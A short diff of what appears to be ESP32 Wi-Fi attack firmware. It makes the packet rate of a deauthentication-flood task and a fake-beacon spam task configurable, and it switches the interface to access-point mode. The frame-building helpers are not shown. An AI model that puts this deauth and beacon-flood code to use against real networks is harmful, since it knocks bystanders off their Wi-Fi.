@@ -284,7 +284,7 @@ void wifi_manager_init() {
     // Initialize the TCP/IP stack and WiFi driver
     ESP_ERROR_CHECK(esp_netif_init());
     ESP_ERROR_CHECK(esp_event_loop_create_default());
-    esp_netif_create_default_wifi_sta();
+    esp_netif_create_default_wifi_ap();
 
     // Initialize WiFi with default settings
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
@@ -468,7 +468,7 @@ void wifi_deauth_task(void *param) {
             {
                 uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                 wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
-                vTaskDelay(10 / portTICK_PERIOD_MS);
+                vTaskDelay(settings_get_broadcast_speed(&G_Settings) / portTICK_PERIOD_MS);
             }
         }
     }
@@ -707,7 +707,7 @@ void wifi_beacon_task(void *param) {
             wifi_manager_broadcast_ap(ssid);
         }
 
-        vTaskDelay(10 / portTICK_PERIOD_MS);
+        vTaskDelay(settings_get_broadcast_speed(&G_Settings) / portTICK_PERIOD_MS);
 
 
         uint8_t random_channel = (esp_random() % 11) + 1;
